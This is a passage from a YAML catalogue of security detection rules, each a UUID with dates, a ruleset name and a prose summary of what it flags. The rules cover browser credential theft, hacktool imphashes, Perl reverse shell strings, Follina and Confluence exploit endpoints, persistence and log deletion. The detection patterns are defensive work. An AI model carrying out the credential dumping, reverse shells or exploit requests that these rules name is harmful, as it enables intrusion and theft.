    Chromium-based browsers, indicating a potential attempt to steal user data. It
    monitors processes on Windows systems where the executable names are `sqlite.exe`
    or `sqlite3.exe`, and examines command lines for paths specific to user profile
    data locations within Chromium-based browsers such as Chrome, Opera, and Sleipnir.
    It further scrutinizes command lines for terms related to valuable user data,
    including login credentials, cookies, web data (e.g., credit card information
    and autofill data), browsing history, and bookmarks.
  Updated-Date: '2024_09_03'
24c8392b-aa3c-46b7-a545-43f71657fe98:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: acf9b6cce539a44eb25f83f172bdec61
  Ruleset: core
  Summary: This rule detects the creation or modification of scheduled tasks on Windows
    systems using suspicious schedules, such as 'ONLOGON', 'ONSTART', 'ONCE', or 'ONIDLE'.
    It identifies these actions by monitoring the execution of 'schtasks.exe' and
    examines the command line for specific keywords. The rule excludes legitimate
    scheduled tasks executed by the 'NT AUTHORITY\SYSTEM' or 'SYSTEM' accounts and
    those run with the highest privileges. This detection aims to identify potentially
    malicious activities, as misuse of scheduled tasks is a common technique used
    by adversaries for persistence and execution.
  Updated-Date: '2024_09_03'
24de4f3b-804c-4165-b442-5a06a2302c7e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 72e24e455fceb477e51a7b9bca8a048a
  Ruleset: sigmahq
  Summary: This rule detects the execution of arbitrary shell commands via the .SettingContent-ms
    file type, which was introduced in Windows 10. These files are XML-based and allow
    users to create shortcuts to various Windows 10 setting pages. The rule specifically
    identifies instances where the CommandLine contains '.SettingContent-ms' but excludes
    those involving 'immersivecontrolpanel'. The aim is to find potentially malicious
    uses of SettingContent-ms files while filtering out legitimate activity.
  Updated-Date: '2024_09_04'
24e3e58a-646b-4b50-adef-02ef935b9fc8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b83ab18f718c8232319c93e4a1935946
  Ruleset: core
  Summary: This rule detects the execution of various Windows-based hacktools by their
    import hash (imphash), even if the files have been renamed. The specific hacktools
    identified include PetitPotam, JuicyPotato, JuicyPotatoNG, RoguePotato, Pwdump,
    PwDumpX, Htran, Cobalt Strike beacons, PPLDump, NanoDump, HandleKatz, DripLoader,
    CreateMiniDump, UACMe Akagi, WCE, Sliver Stagers, Dumpert, SysmonEnte, SysmonQuiet,
    ShaprEvtMute Hook, Forkatz, PPLKiller, Backstab, Forensia, EDRSandBlast, EDRSilencer,
    and EventLogCrasher. These tools are associated with credential access, lateral
    movement, and payload execution, indicating activities such as password dumping,
    privilege escalation, and evading defenses. Identifying the specific imphashes
    allows for the detection of these malicious activities despite any attempts by
    attackers to disguise the malware by renaming the files.
  Updated-Date: '2024_09_03'
252902e3-5830-4cf6-bf21-c22083dfd5cf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a251af1b74ff52b1126d23d1d65ec7d
  Ruleset: core
  Summary: This rule detects the use of Impacket's SecretDump tool for remote Activity
    Directory credential dumping on Windows systems. It identifies suspicious access
    to the administrative shares (\\\\\*\\ADMIN\$) coupled with temporary files and
    SYSTEM32 directory references. This activity is indicative of an attempt to access
    and extract credential data, which is a known tactic of the SecretDump tool. The
    detection relies on specific event logs that indicate file share access attempts
    and requires the audit policy for detailed file sharing to be configured for both
    success and failure events.
  Updated-Date: '2024_09_03'
25676e10-2121-446e-80a4-71ff8506af47:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc14d81c173db0f92388367db8fb80e1
  Ruleset: core
  Summary: This rule detects the usage of Exchange PowerShell snap-ins, specifically
    for activities related to exporting mailbox data. It monitors the execution of
    PowerShell or PowerShell Core instances where the 'Add-PSSnapin' command is used
    in conjunction with snap-ins like 'Microsoft.Exchange.Powershell.Snapin' or 'Microsoft.Exchange.Management.PowerShell.SnapIn'.
    This behavior has been observed in cyber-attacks conducted by threat groups such
    as HAFNIUM and APT27, which exploit Microsoft Exchange vulnerabilities. The rule
    excludes instances where the command might be launched by the Microsoft Installer
    (msiexec.exe) to reduce false positives.
  Updated-Date: '2024_09_03'
2569ed8c-1147-498a-9b8c-2ad3656b10ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ae392193a2c943b322a082a5c6f801c
  Ruleset: core
  Summary: This rule detects instances where the command line includes 'DllRegisterServer'
    and the associated image is not 'rundll32.exe'. This scenario could indicate that
    the rundll32 utility has been renamed, likely as an evasion technique to avoid
    detection.
  Updated-Date: '2024_09_03'
258b6593-215d-4a26-a141-c8e31c1299a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cdf4a924ca3606dcc794a1aaaa7e596d
  Ruleset: core
  Summary: This rule detects anomalous user activity that indicates suspicious changes
    to the directory. It relies on identifying risk events categorized as 'anomalousUserActivity'
    and is designed to highlight patterns of behavior that may be indicative of security
    threats. This detection method helps in identifying potential risks tied to unauthorized
    access or other malicious activities within an Azure environment. Investigations
    should consider these flagged sessions alongside other user sign-ins to reduce
    false positives.
  Updated-Date: '2024_09_03'
258fc8ce-8352-443a-9120-8a11e4857fa5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1110177f0d7b3bcd173fa50392b4c849
  Ruleset: core
  Summary: This rule detects the potential execution of arbitrary commands using the
    "ms-msdt" handler or the "msdt.exe" binary, specifically targeting the Follina
    (CVE-2022-30190) vulnerability. It monitors for the creation of processes where
    the image name ends with '\msdt.exe' or if the original file name is 'msdt.exe'.
    Additionally, it looks for specific command line patterns including 'IT_BrowseForFile='
    or 'PCWDiagnostic' and also checks for the use of the '-af' parameter. The rule
    helps identify attempts to exploit vulnerabilities by leveraging these specific
    characteristics in process creation on Windows systems.
  Updated-Date: '2024_09_03'
259a9cdf-c4dd-4fa2-b243-2269e5ab18a2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 540346c9ff8db8f57a75ee21cabf6ccf
  Ruleset: sigmahq
  Summary: This rule detects successful logons from public IP addresses via Remote
    Desktop Protocol (RDP) on Windows systems, which can indicate that an RDP port
    is exposed to the public. The detection is based on event ID 4624 with a logon
    type 10, while excluding known local and private IP ranges as well as unspecified
    IP addresses.
  Updated-Date: '2024_09_04'
259dda31-b7a3-444f-b7d8-17f96e8a7d0d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ed9be45a6c28e8b7b695ae6757cdf73
  Ruleset: sigmahq
  Summary: This rule detects the loading of "RjvPlatform.dll" by the "SystemResetPlatform.exe"
    binary, indicating possible DLL side-loading activity. DLL side-loading occurs
    when a legitimate executable loads a malicious DLL from a location that is not
    created by default, in this case, the "$SysReset" directory. This method can be
    used for defense evasion or privilege escalation on Windows systems.
  Updated-Date: '2024_09_04'
259df6bc-003f-4306-9f54-4ff1a08fa38e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5345163962b41a85b937e2176466c710
  Ruleset: core
  Summary: This rule detects the execution of the Perl binary with the "-e" flag alongside
    common strings indicative of potential reverse shell activity. It identifies specific
    command-line patterns involving Perl, such as the use of 'fdopen(' and '::Socket::INET'
    or the combination of 'Socket', 'connect', 'open', and 'exec'. The intent is to
    spot attempts commonly associated with reverse shells, which are techniques attackers
    use to remotely gain control over a target system.
  Updated-Date: '2024_09_03'
25b9c01c-350d-4b95-bed1-836d04a4f324:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3688ddd91de4dd08c86536f53730d76
  Ruleset: core
  Summary: This rule detects the usage of the Moriya rootkit, specifically looking
    for its behavior as described in the Operation TunnelSnake report from Securelist.
    It monitors the Windows System logs for events generated by the Service Control
    Manager with Event ID 7045 and a service name of "ZzNetSvc." The appearance of
    this service in logs indicates potential Moriya rootkit activity, which involves
    methods for persistence and privilege escalation on the affected system.
  Updated-Date: '2024_09_03'
25cb1ba1-8a19-4a23-a198-d252664c8cef:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48a8b73e51b74fb3b0a8c9c068300b60
  Ruleset: sigmahq
  Summary: This rule detects when an AWS Elastic File System (EFS) fileshare is modified
    or deleted. It monitors events from the AWS CloudTrail service where the `DeleteFileSystem`
    operation on the `elasticfilesystem.amazonaws.com` event source is observed. This
    rule identifies potential unauthorized modifications or deletions of file systems,
    where it is noted that an adversary must first delete any mount targets before
    deleting the file share itself.
  Updated-Date: '2024_09_04'
25cb259b-bbdc-4b87-98b7-90d7c72f8743:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 680219b034a20e56ce10ceab21f48149
  Ruleset: sigmahq
  Summary: This rule detects the creation, modification, or deletion of potential
    malicious RoleBindings and ClusterRoleBindings in an Azure Kubernetes environment.
    It monitors specific operations within Azure Activity Logs, particularly WRITE
    and DELETE actions on ClusterRoleBindings and RoleBindings associated with Kubernetes
    Role-Based Access Control (RBAC). This activity may indicate an attempt to gain
    unauthorized permissions or disrupt cluster operations. It is essential to verify
    if such modifications are legitimate by examining the identity and user agent
    performing these actions, especially if they originate from unfamiliar users.
  Updated-Date: '2024_09_04'
25cde13e-8e20-4c29-b949-4e795b76f16f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b28f8433dfcbd3ae864761d4fbd78146
  Ruleset: core
  Summary: This rule detects access to authentication tokens and accounts associated
    with the Microsoft Teams desktop application. It specifically monitors for Event
    ID 4663 related to the accessing of files within the directories '\Microsoft\Teams\Cookies'
    and '\Microsoft\Teams\Local Storage\leveldb'. This access is considered suspicious
    unless it is performed by the Microsoft Teams executable ('Teams.exe'). This detection
    aims to identify potential credential access attacks exploiting stored authentication
    tokens to gain unauthorized access.
  Updated-Date: '2024_09_03'
25eabf56-22f0-4915-a1ed-056b8dae0a68:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f40414d8276d95075eabcbabbc89a44d
  Ruleset: core
  Summary: This rule detects suspicious activity involving an executable that communicates
    with the Dropbox API but is not the official Dropbox application. This can indicate
    potential unauthorized or malicious usage of Dropbox services, which is commonly
    associated with command-and-control techniques where attackers transfer data or
    execute commands through trusted APIs like Dropbox. Detection focuses on network
    connections to specific Dropbox API endpoints while filtering out legitimate Dropbox
    processes to minimize false positives.
  Updated-Date: '2024_09_03'
2617e7ed-adb7-40ba-b0f3-8f9945fe6c09:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d30e14d4feaeb2ff7d3c6d320b19417
  Ruleset: core
  Summary: This rule detects the creation of suspicious processes executed by the
    SYSTEM user on a Windows operating system. It identifies abnormal behavior by
    examining process creation events for specific executable files and command line
    parameters often associated with malicious activities. These include PowerShell
    commands, certificate utility decodings, system service manipulations, registry
    modifications, shadow copy deletions (common in ransomware), and various Mimikatz
    modules for credential extraction and manipulation. The detection targets processes
    such as calc.exe, mshta.exe, and scripts executed through cscript.exe or wscript.exe,
    while filtering out benign administrative and legitimate software activities to
    reduce false positives.
  Updated-Date: '2024_09_03'
2632954e-db1c-49cb-9936-67d1ef1d17d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d00261d175519561c58463aad6ca6fb
  Ruleset: sigmahq
  Summary: This rule detects the addition of Security Identifier (SID) History to
    an Active Directory object, an action that attackers may use to gain additional
    privileges within the network. The rule monitors specific event IDs associated
    with changes to SID History and identifies anomalies that suggest suspicious activity.
    While legitimate migrations of accounts into a new domain may trigger similar
    events, they are considered potential false positives.
  Updated-Date: '2024_09_04'
26481afe-db26-4228-b264-25a29fe6efc7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 616dcf8b48be631e2dae6d9784cfaf7c
  Ruleset: sigmahq
  Summary: This rule detects uncommon service installation commands on Windows systems
    by examining the image path values for suspicious or uncommon patterns. It specifically
    looks for references to encoded PowerShell commands, temporary paths, and public
    directories, which are often indicative of potential malicious activity. It filters
    out legitimate paths associated with Windows Defender definition updates and certain
    remote execution tools to reduce false positives.
  Updated-Date: '2024_09_04'
26488ad0-f9fd-4536-876f-52fea846a2e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 762f34021bbcfe94686d42372dacfe82
  Ruleset: core
  Summary: This rule detects the execution of the hack tool SharPersist, which is
    used to implement various persistence mechanisms on a Windows system. It identifies
    instances where the process creation logs show the execution of SharPersist.exe
    or the product identified as SharPersist. The detection criteria include specific
    command-line arguments associated with tasks such as scheduled tasks, startup
    folders, registry modifications, and service additions, indicating the deployment
    of persistence methods.
  Updated-Date: '2024_09_03'
264982dc-dbad-4dce-b707-1e0d3e0f73d9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5fa584f7ff4a6dba9d842e6e7bb27933
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed "NirCmd.exe" binary by analyzing
    the PE metadata fields. NirCmd is a command-line utility capable of performing
    various system tasks, and its use in a renamed form may indicate malicious behavior,
    such as execution or defense evasion tactics. The rule triggers when such execution
    is observed, provided it does not match expected benign names.
  Updated-Date: '2024_09_04'
2650dd1a-eb2a-412d-ac36-83f06c4f2282:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81000aaf6c512b976c06fccddea39836
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands that adversaries may utilize
    to enumerate installed software on a Windows system. This activity can be part
    of an effort to identify security measures, or to determine if any vulnerable
    software versions are present. The detection focuses on specific patterns within
    PowerShell script block text, including commands like `get-itemProperty`, references
    to the software registry path, and formatting output for display. This behavior
    might sometimes be observed in legitimate administrative tasks, but it is flagged
    to highlight potential malicious reconnaissance activities.
  Updated-Date: '2024_09_04'
26b692dc-1722-49b2-b496-a8258aa6371d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6af735724ddc05996189ad60fcc53a05
  Ruleset: sigmahq
  Summary: This rule detects attempts to clear PowerShell history by identifying specific
    keywords and command patterns. It searches for terms such as 'del', 'Remove-Item',
    and 'rm', as well as checking for actions that involve the 'Get-PSReadlineOption'
    and 'Set-PSReadlineOption' cmdlets with options to disable history saving. The
    presence of these elements in script blocks may indicate efforts to remove evidence
    of executed commands, serving as a defense evasion tactic.
  Updated-Date: '2024_09_04'
26e7c5e2-6545-481e-b7e6-050143459635:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d7661449e5f550175c15af8a78919d2
  Ruleset: sigmahq
  Summary: This rule detects instances where a conditional access policy is removed
    by an unauthorized or non-approved actor in an Azure environment. The detection
    is based on logs from the audit service, specifically monitoring for messages
    indicating the deletion of a conditional access policy. This type of activity
    may be associated with defense evasion and persistence techniques as categorized
    by relevant attack frameworks. Potential false positives can include misconfigured
    role permissions and legitimate changes by authorized users, and will require
    verification of the user's identity and role.
  Updated-Date: '2024_09_04'
270185ff-5f50-4d6d-a27f-24c3b8c9fef8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 632cd2c3cf5a0d181b350dc74106e999
  Ruleset: sigmahq
  Summary: This rule detects the deletion of Tomcat WebServer logs on Windows systems,
    which may indicate an attempt to destroy forensic evidence. Specific log files
    such as 'catalina.', '_access_log.', and 'localhost.' within the Tomcat logs directory
    are monitored for deletion events. Such activity could be part of defense evasion
    tactics, aligning with attack technique T1070. There are legitimate scenarios
    such as uninstallation of the Tomcat server and log rotation that could trigger
    this detection.
  Updated-Date: '2024_09_04'
2704ab9e-afe2-4854-a3b1-0c0706d03578:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64db1c30f3248c3816f1e3e03c4edcd6
  Ruleset: core
  Summary: This rule detects the use of the Dumpert process dumper, a hacking tool
    designed to dump the memory of the lsass.exe process. This activity is typically
    associated with credential access attacks. Dumpert is a tool available on GitHub
    and has been noted in cybersecurity reports, such as those by Palo Alto Networks'
    Unit 42, for its exploitation in cyberattacks. The rule identifies Dumpert usage
    through specific hash values and command line parameters.
  Updated-Date: '2024_09_03'
272e55a4-9e6b-4211-acb6-78f51f0b1b40:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 527b2316237437f12ef2f8553940417f
  Ruleset: core
  Summary: This rule detects the removal of folders from the "ProtectedFolders" list
    in Windows Defender Exploit Guard. Such activity could indicate that an attacker
    is attempting to disable protections to launch an encryption process or manipulate
    data within the protected folders. This action is logged as a registry deletion
    event targeting the specific path for ProtectedFolders in Windows Defender settings,
    and it suggests possible defense evasion tactics. Although legitimate administrators
    may occasionally perform this action, it should always be investigated due to
    the high severity of the potential threat.
  Updated-Date: '2024_09_03'
273a8dd8-3742-4302-bcc7-7df5a80fe425:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25d98d40d73fdc527955e7f912028a9b
  Ruleset: core
  Summary: This rule detects potential DLL sideloading of an unsigned `dbghelp.dll`
    by the Sysinternals VMMap. VMMap is a utility used to analyze the virtual and
    physical memory usage of processes. The rule identifies cases where VMMap or VMMap64
    executable files load a `dbghelp.dll` from the `C:\Debuggers\` directory, while
    also ensuring that the loaded DLL is not signed. Such activity can indicate an
    attempt to evade defenses, establish persistence, or escalate privileges.
  Updated-Date: '2024_09_03'
275641a5-a492-45e2-a817-7c81e9d9d3e9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c10ead2a2a34ed8e30bbf2ef2a51f51
  Ruleset: sigmahq
  Summary: This rule detects the addition of the 'DisallowRun' value in the Windows
    registry, specifically setting it to 1. This setting in the registry is used to
    prevent users from running specific programs by adding them to the DisallowRun
    list, thereby aiding in defense evasion tactics.
  Updated-Date: '2024_09_04'
277a4393-446c-449a-b0ed-7fdc7795244c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5056fdf927908f196b19ebd81ef39f6f
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed "ftp.exe" binary by examining
    PE (Portable Executable) metadata fields. It identifies when the original filename
    is "ftp.exe" but the executed file has been renamed, assisting in spotting potential
    attempts to evade security measures using this legitimate file transfer utility
    in an unauthorized manner. This activity can be associated with tactics such as
    execution and defense evasion.
  Updated-Date: '2024_09_04'
277efb8f-60be-4f10-b4d3-037802f37167:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5a53f98ae6c3713eb5c55a49c5b6f9f
  Ruleset: core
  Summary: This rule detects persistence mechanisms within the Windows Registry associated
    with the Recycle Bin. Specifically, it monitors for the creation or renaming of
    keys and the setting of values that could be used to establish persistence through
    the Recycle Bin's `CLSID\{645FF040-5081-101B-9F08-00AA002F954E}` path. This method
    is typically utilized by malware to ensure it remains active on a system between
    reboots.
  Updated-Date: '2024_09_03'
27aec9c9-dbb0-4939-8422-1742242471d0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b5fe1bd87968bd546332b93ce88e74d
  Ruleset: core
  Summary: This rule detects the use of obfuscated environment variables to execute
    PowerShell commands. The obfuscation techniques involve intricate variable settings
    and complex string manipulations to disguise the command sequences, particularly
    notable in scenarios where "cmd.exe" uses a "/c" switch to set environment variables
    and subsequently invokes PowerShell through these obfuscated strings. This method
    can be indicative of evasion tactics employed to bypass standard security mechanisms
    and execute potentially malicious scripts.
  Updated-Date: '2024_09_03'
27ba3207-dd30-4812-abbf-5d20c57d474e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 653e82ad23a04cccb0ba234f6e9caf40
  Ruleset: sigmahq
  Summary: This rule detects the execution of a Chromium-based browser instance initiated
    by a suspicious process using the 'load-extension' flag, which indicates the loading
    of a custom extension. It monitors processes starting from various parent applications
    such as `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`,
    `rundll32.exe`, and `wscript.exe`, launching browsers like `brave.exe`, `chrome.exe`,
    `msedge.exe`, `opera.exe`, and `vivaldi.exe` with the specific command line argument
    `--load-extension=`. This activity can signify attempts at malicious persistence
    tactics using custom browser extensions.
  Updated-Date: '2024_09_04'
27d2cdde-9778-490e-91ec-9bd0be6e8cc6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 394991ddbce526279b16f6be5aeafbd3
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting the CVE-2023-22518 vulnerability
    in Confluence Data Center and Confluence Server. Attackers can exploit certain
    endpoints to create admin accounts and execute arbitrary commands. The rule identifies
    HTTP POST requests to specific endpoints such as '/json/setup-restore-local.action',
    '/json/setup-restore-progress.action', and '/setup/setupadministrator.action'
    with status codes 200, 302, or 405. Such activities may indicate an attempt to
    exploit this vulnerability, though false positives may include legitimate vulnerability
    scanning. References include detailed write-ups and exploit tactics for CVE-2023-22518.
  Updated-Date: '2024_09_03'
27e4f1d6-ae72-4ea0-8a67-77a73a289c3d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 20ed4d1332697f4fbf44f90820a059e5
  Ruleset: core
  Summary: This rule detects suspicious inbox forwarding activity that may indicate
    a security threat. Specifically, it identifies when an inbox rule is created to
    forward a copy of all emails to an external address, which can be a sign of unauthorized
    access or data exfiltration. This activity is considered risky and is classified
    under the risk event type 'suspiciousInboxForwarding'. While legitimate forwarding
    rules can exist, this detection focuses on identifying potential malicious behavior
    within Azure's risk detection services.
  Updated-Date: '2024_09_03'
27ee9438-90dc-4bef-904b-d3ef927f5e7e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f8b460f42544db4e422d6d80855bc44
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Windows Kernel Debugger "kd.exe,"
    which is often used for debugging kernel-level code. The presence of this debugger
    on a system can indicate attempts at defense evasion or privilege escalation.
    While legitimate uses of kernel debugging in production environments are rare
    and require further investigation, identifying the process creation of "kd.exe"
    is important for security monitoring.
  Updated-Date: '2024_09_04'
28036918-04d3-423d-91c0-55ecf99fb892:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5037195b4e65ad1fdc07eef1a632233a
  Ruleset: core
  Summary: This rule detects changes to the NGenAssemblyUsageLog registry key, which
    is used to control the output location of the .NET Usage Log by setting the NGenAssemblyUsageLog
    CLR configuration knob. By specifying arbitrary values, such as fake output locations
    or junk data, a Usage Log file for the .NET execution context will not be created.
    This manipulation can be an indication of attempts to evade detection by Endpoint
    Detection and Response (EDR) systems.
  Updated-Date: '2024_09_03'
28208707-fe31-437f-9a7f-4b1108b94d2e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d330d26ec8d41cb69694286bc2742a13
  Ruleset: core
  Summary: This rule detects the creation of files with specific suspicious extensions
    in the startup folder on Windows systems. The extensions include '.vbs', '.vbe',
    '.bat', '.ps1', '.hta', '.dll', '.jar', '.msi', '.scr', and '.cmd'. Such activity
    is often associated with persistence mechanisms used by attackers to maintain
    access to a compromised system. Legitimate use of these extensions in the startup
    folder, although rare, may occur.
  Updated-Date: '2024_09_03'
28268a8f-191f-4c17-85b2-f5aa4fa829c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbe877930eb7a4607ea5191c7e925b6a
  Ruleset: sigmahq
  Summary: This rule detects when a DNS Zone is modified or deleted in Google Cloud.
    It identifies specific actions such as deletion, updates, and patches to the managed
    DNS Zones by monitoring the audit logs for these activities.
  Updated-Date: '2024_09_04'
2837e152-93c8-43d2-85ba-c3cd3c2ae614:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4ef08ca34a15e8b634a72ec4d3d61f1
  Ruleset: sigmahq
  Summary: This rule detects attempts to collect local email data using PowerShell
    scripts on Windows systems. Specifically, it identifies usage of certain script
    components that interact with Microsoft Outlook, such as 'Get-Inbox.ps1', 'Microsoft.Office.Interop.Outlook',
    'Microsoft.Office.Interop.Outlook.olDefaultFolders', and the '-comobject outlook.application'
    script. Adversaries may leverage these scripts to access and extract sensitive
    email information stored in Outlook files on the user's local system, posing a
    risk of data exfiltration and information theft.
  Updated-Date: '2024_09_04'
285b85b1-a555-4095-8652-a8a4106af63f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3561dfce344596ce3d9c82af0e547c0
  Ruleset: sigmahq
  Summary: This rule detects the execution of "runonce.exe" initiated by "rundll32.exe"
    when the latter loads "setupapi.dll" and calls the "InstallHinfSection" function.
    "Setupapi.dll" is used for processing INF files, which can instruct changes in
    the registry, modifications to files, and driver installations. This behavior
    could facilitate persistence mechanisms by altering "Run" or "RunOnce" registry
    keys or leveraging other DLL call chains. Legitimate administrative tools and
    scripts that utilize INF files for driver installations may trigger this rule.
  Updated-Date: '2024_09_04'
286b47ed-f6fe-40b3-b3a8-35129acd43bc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f95c3c6466270333c3e796b99f2aed0
  Ruleset: sigmahq
  Summary: This rule detects access to files with sensitive extensions, including
    but not limited to email-related files (.pst, .ost, .msg), backups (.bak), dump
    files (.dmp), Kerberos tickets (.kirbi), group configuration files (\groups.xml),
    and remote desktop protocol files (.rdp) through Zeek monitoring SMB file activity.
    Such access may indicate potentially suspicious behavior, though it may also be
    legitimate activity by help desk operators or users working with these data types.
  Updated-Date: '2024_09_04'
288a39fc-4914-4831-9ada-270e9dc12cb4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a43f3d45c8b02c9d7bf67961d18d2580
  Ruleset: sigmahq
  Summary: This rule detects the creation or update of a server instance in the Azure
    Active Directory Hybrid Health Active Directory Federation Services (ADFS) service
    using Azure activity logs categorized under Administrative. It identifies potential
    malicious activities where a threat actor might create a new AD Health ADFS service
    and a fake server instance to spoof AD FS signing logs without needing to compromise
    an on-premises AD FS server. This action can be performed programmatically via
    HTTP requests to Azure.
  Updated-Date: '2024_09_04'
28a452f3-786c-4fd8-b8f2-bddbe9d616d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0649469af073ecba323f5a599b3b2b14
  Ruleset: core
  Summary: This rule detects the creation of the WerFault.exe or wer.dll files in
    unusual folders, which may indicate a potential attempt at WerFault DLL hijacking.
    This tactic is used by attackers to hide malware within Windows Event Logs, bypassing
    traditional security measures and achieving persistence and defense evasion.
  Updated-Date: '2024_09_03'
28ac00d6-22d9-4a3c-927f-bbd770104573:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee028b55d1bf337f9b78d8a20353e823
  Ruleset: core
  Summary: This rule detects changes to the "DisableRestrictedAdmin" registry value,
    which can disable or enable RestrictedAdmin mode on Windows systems. RestrictedAdmin
    mode is designed to prevent the transmission of reusable credentials to the remote
    system during Remote Desktop connections, thereby protecting user credentials
    from being harvested if the remote server is compromised. Such tampering can indicate
    attempts to manipulate system security settings and potentially facilitate unauthorized
    access or credential theft.
  Updated-Date: '2024_09_03'
28c8f68b-098d-45af-8d43-8089f3e35403:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f43d5a16c27f49271d5d7077c11f33b8
  Ruleset: sigmahq
  Summary: This rule detects the potential abuse of the "register_app.vbs" script,
    which is part of the Windows SDK. Attackers may exploit this script to register
    new VSS/VDS Providers as COM+ applications, enabling them to install malicious
    DLLs for persistence and execution. The detection focuses on process creation
    events associated with the execution of "cscript.exe" or "wscript.exe" accompanied
    by specific command line flags indicating the use of "register_app.vbs".
  Updated-Date: '2024_09_04'
28ecba0a-c743-4690-ad29-9a8f6f25a6f9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c0d841b1afa15269fc3870f55ab6068
  Ruleset: core
  Summary: This rule detects a successful password spray attack, which is an attempt
    to gain unauthorized access by trying a single password across multiple accounts
    in a systematic manner. The detection focuses on identifying risk events labeled
    as 'passwordSpray' within Azure's risk detection service.
  Updated-Date: '2024_09_03'
293ccb8c-bed8-4868-8296-bef30e303b7e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f42122cced79f67061c86c4d60348620
  Ruleset: emerging-threats
  Summary: This rule detects exploitation indicators of CVE-2022-42475, a heap-based
    buffer overflow vulnerability in FortiOS SSL-VPN (sslvpnd). It identifies the
    presence of specific file paths such as '/data/etc/wxd.conf' and various libraries
    under '/data/lib/', which are associated with the exploitation attempts of this
    vulnerability. The vulnerability allows for pre-authentication remote code execution,
    posing a high level of risk.
  Updated-Date: '2024_09_03'
295a59c1-7b79-4b47-a930-df12c15fc9c2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 395226b470512074450863b1d7d4cb14
  Ruleset: sigmahq
  Summary: This rule detects modifications to trust records within the Windows registry,
    which can indicate the execution of macros. Macros, often used in document files,
